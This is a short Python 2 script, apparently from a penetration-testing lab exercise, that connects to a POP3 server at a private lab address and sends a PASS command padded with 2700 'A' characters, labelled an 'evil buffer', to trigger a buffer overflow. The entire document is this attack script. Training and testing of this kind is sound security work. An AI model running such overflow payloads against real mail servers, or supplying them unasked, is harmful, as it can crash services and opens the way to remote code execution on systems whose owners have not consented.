#!/usr/bin/env python
import socket

buffer = "A" * 2700

try:
    print "\nSending evil buffer..."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.11.16.124', 110))
    data = s.recv(1024)
    s.send('USER test\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    s.send('QUIT\r\n')
    s.close()
    print "\nDone!"
except:
    print "Could not connect to POP3!"


